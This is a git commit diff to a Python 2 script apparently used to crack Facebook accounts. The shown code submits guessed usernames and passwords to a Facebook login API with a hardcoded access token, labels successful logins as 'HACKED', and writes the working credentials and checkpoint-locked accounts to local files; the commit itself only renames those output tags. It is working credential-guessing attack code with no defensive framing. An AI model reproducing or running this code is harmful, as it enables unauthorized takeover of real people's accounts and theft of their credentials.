cf9a18fb80ca4a40bb2485ac7eef71325dfda0f0
Rihan Ahmed <95731297+Rihan444@users.noreply.github.com>
2022-11-04 15:24:52 +0600

    Update Rihan-CL BD.py

--- Rihan-CL BD.py
+++ Rihan-CL BD.py
@@ -228,13 +228,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[SH-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[BHHC-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[SH-CP] \x1b[1;92m' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Open After 7 Days]\n'
+                print '\x1b[1;91m[BHHC-CP] \x1b[1;92m' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Open After 7 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
